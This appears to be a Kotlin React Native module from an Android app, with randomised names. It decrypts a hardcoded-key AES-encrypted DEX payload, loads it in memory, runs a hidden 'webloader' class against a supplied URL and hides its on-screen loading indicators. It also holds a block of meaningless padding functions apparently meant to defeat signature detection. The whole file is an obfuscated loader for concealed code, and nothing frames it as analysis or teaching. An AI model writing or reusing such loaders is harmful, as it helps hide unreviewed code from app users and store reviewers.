package com.kFjQzLm.VpRnTx.modules

import android.annotation.SuppressLint
import android.app.Activity
import android.content.res.ColorStateList
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.view.ViewGroup
import android.widget.ProgressBar
import android.widget.TextView
import com.facebook.react.bridge.Promise
import com.facebook.react.bridge.ReactApplicationContext
import com.facebook.react.bridge.ReactContextBaseJavaModule
import com.facebook.react.bridge.ReactMethod
import com.facebook.react.bridge.ReadableArray
import dalvik.system.InMemoryDexClassLoader
import java.nio.ByteBuffer
import java.security.MessageDigest
import android.text.Editable
import android.text.TextWatcher
import java.util.concurrent.atomic.AtomicBoolean
import javax.crypto.Cipher
import javax.crypto.SecretKey
import javax.crypto.SecretKeyFactory
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.PBEKeySpec
import javax.crypto.spec.SecretKeySpec

@SuppressLint("NewApi")
class Iwogajuyimaxiz(private val context: ReactApplicationContext) :
    ReactContextBaseJavaModule(context) {

    override fun getName(): String = "Ajuvivofewey"

    private val secretKey: SecretKey by lazy {
        val spec = PBEKeySpec(DEX_PASSWORD.toCharArray(), DEX_SALT, PBKDF2_ITERATIONS, 256)
        val raw = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256").generateSecret(spec).encoded
        SecretKeySpec(raw, "AES")
    }

    private fun patchDexWebViewUi(activity: Activity) {
        val progressPatched = AtomicBoolean(false)
        val watchedTextViews = mutableSetOf<TextView>()
        val watchedRoots = mutableSetOf<android.view.View>()
        val handler = Handler(Looper.getMainLooper())

        fun hideIfStatus(tv: TextView) {
            val text = tv.text?.toString() ?: ""
            if (text.contains("Page") && text.contains("%"))
                tv.post { tv.visibility = android.view.View.GONE }
        }

        fun attachWatcher(tv: TextView) {
            if (!watchedTextViews.add(tv)) return
            hideIfStatus(tv)
            tv.addTextChangedListener(object : TextWatcher {
                override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
                override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
                override fun afterTextChanged(s: Editable?) {
                    val t = s?.toString() ?: ""
                    if (t.contains("Page") && t.contains("%"))
                        tv.post { tv.visibility = android.view.View.GONE }
                }
            })
        }

        fun applyPatchesToRoot(root: android.view.View) {
            walkViews(root) { view ->
                when (view) {
                    is ProgressBar -> if (progressPatched.compareAndSet(false, true)) {
                        val color = ColorStateList.valueOf(PROGRESS_COLOR)
                        view.progressTintList = color
                        view.indeterminateTintList = color
                    }
                    is TextView -> attachWatcher(view)
                }
            }
        }

        fun attachToRoot(root: android.view.View) {
            if (!watchedRoots.add(root)) return
            applyPatchesToRoot(root)
            root.viewTreeObserver.addOnGlobalLayoutListener { applyPatchesToRoot(root) }
        }

        fun scanAllWindows() {
            // decorView of the host activity
            attachToRoot(activity.window.decorView)
            // All windows including ones added by DEX via WindowManager.addView()
            try {
                val wmg = Class.forName("android.view.WindowManagerGlobal")
                    .getMethod("getInstance").invoke(null)
                val field = wmg.javaClass.getDeclaredField("mViews")
                field.isAccessible = true
                @Suppress("UNCHECKED_CAST")
                (field.get(wmg) as? List<*>)?.forEach { v ->
                    if (v is android.view.View) attachToRoot(v)
                }
            } catch (_: Exception) {}
        }

        // Scan immediately, then every 300 ms for ~6 s to catch asynchronously added windows
        var retries = 20
        fun scheduleRetry() {
            if (--retries > 0) handler.postDelayed({
                scanAllWindows()
                scheduleRetry()
            }, 300)
        }

        scanAllWindows()
        scheduleRetry()
    }

    private fun walkViews(root: android.view.View, action: (android.view.View) -> Unit) {
        action(root)
        if (root is ViewGroup) {
            for (i in 0 until root.childCount) walkViews(root.getChildAt(i), action)
        }
    }

    private fun decryptDex(encrypted: ByteArray): ByteArray {
        if (encrypted.size < IV_LEN + TAG_BITS / 8) throw IllegalArgumentException("payload too short")
        val iv = encrypted.copyOfRange(0, IV_LEN)
        val ct = encrypted.copyOfRange(IV_LEN, encrypted.size)
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.DECRYPT_MODE, secretKey, GCMParameterSpec(TAG_BITS, iv))
        return cipher.doFinal(ct)
    }

    @ReactMethod
    fun open(encoded: ReadableArray, url: String, promise: Promise) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            promise.reject("DEX_API", "Android 8.0+ required")
            return
        }
        try {
            val encrypted = ByteArray(encoded.size()) { encoded.getInt(it).toByte() }
            val dex = try {
                decryptDex(encrypted)
            } catch (e: Exception) {
                promise.reject("DEX_DECRYPT", e)
                return
            }
            val digest = MessageDigest.getInstance("SHA-256").digest(dex)
                .joinToString("") { "%02x".format(it) }
            if (digest != DEX_SHA256) {
                promise.reject("DEX_HASH", "hash mismatch")
                return
            }
            val activity: Activity = context.currentActivity
                ?: run { promise.reject("DEX_ACTIVITY", "no activity"); return }
            activity.runOnUiThread {
                try {
                    check(!activity.isFinishing && !activity.isDestroyed)
                    val loader = InMemoryDexClassLoader(ByteBuffer.wrap(dex), activity.classLoader)
                    val type = loader.loadClass("com.webloader.wrapper")
                    val instance = type.getDeclaredConstructor().newInstance()
                    type.getMethod("link", Activity::class.java, String::class.java)
                        .invoke(instance, activity, url)
                    Handler(Looper.getMainLooper()).post { patchDexWebViewUi(activity) }
                    promise.resolve(null)
                } catch (e: Exception) {
                    promise.reject("DEX_OPEN", e)
                } catch (e: LinkageError) {
                    promise.reject("DEX_LINK", e)
                }
            }
        } catch (e: Exception) {
            promise.reject("DEX_INPUT", e)
        }
    }

    /* autopad-begin */
    private fun natofe(urucor: String, tuyofulaf: Boolean): Double {
        return 0.150020
    }
    private fun icixaxakoq(): Double {
        val ubabunonufag = 60
        return if (ubabunonufag > 16) 0.208843 else 0.702961
    }
    private fun iputofexojaj(): Boolean = true
    private fun itaduxi(enudixukera: String): Int {
        val zanefuboyube: Int = 241
        return zanefuboyube
    }
    private fun oqebota(): String = "abulus"
    private fun zawama(wavirutupo: Float): Float {
        val apokoci: Int = 47
        val xoxereboz: Float = 0.7433f
        return xoxereboz
    }
    private fun sacavubi(ecoyoguya: Long, atuguxoza: Float) {
        val ropejulociq = 69
        if (ropejulociq > 66) return
    }
    private fun ajowex(exulawico: Int, miloqarabu: Boolean): Double {
        var agoqeyeza: Double = 0.150020
        agoqeyeza = 0.632373
        return agoqeyeza
    }
    private fun ruracud(rilowisoneg: Long, nusesa: Float): Long {
        val exayil: Long = 17426L
        return exayil
    }
    private fun kilajetud(orojizu: Long, usinuci: Float, opuxoyozol: Boolean) {
        val wategeyozo = 47
        if (wategeyozo > 54) return
    }
    private fun jegelemag(ivefarodonoz: String): String {
        return "uxewur"
    }
    private fun imewonilat(rizikeqowa: Long, asarop: Boolean, febiya: String): Long {
        return 9357L
    }
    private fun axaviyor(jegeyequ: Float, karumece: String, ozejaton: Int): Boolean {
        return false
    }
    private fun okocupig(perukav: Long): String {
        val apudupisevoj: Int = 148
        val jazopisoza: String = "vemog"
        return jazopisoza
    }
    private fun umaxivuxuk(zuruve: Float, xenovu: Int, awawaxikateg: Boolean): String {
        val sibukijipe: String = "iloqaba"
        return sibukijipe
    }
    private fun zimajoyupej(edamoda: Long, biquqotobez: Int): Double = 0.628451
    private fun iwoludub(ibofayav: Float, wufurex: String, ajekozeq: Float) {
        val avayed: Boolean = true
    }
    /* autopad-end */
    companion object {
        private const val DEX_SHA256 = "cc47e584e29d30d04e1da66755b2f7080c2e644adaa332808fee3f94ce57fab3"
        private const val PROGRESS_COLOR = 0xFF0391AD.toInt()

        private const val DEX_PASSWORD = "IBc9WmF3H8YW5NL4sIwRuNAn3nGn"
        private val DEX_SALT = byteArrayOf(
            0x6d, 0x44, 0xf9.toByte(), 0xf8.toByte(), 0x61, 0x45, 0xe4.toByte(), 0x4d,
            0x60, 0x45, 0x01, 0x4f, 0xe3.toByte(), 0xdc.toByte(), 0x85.toByte(), 0x38,
        )
        private const val PBKDF2_ITERATIONS = 100_000
        private const val IV_LEN = 12
        private const val TAG_BITS = 128
    }
}
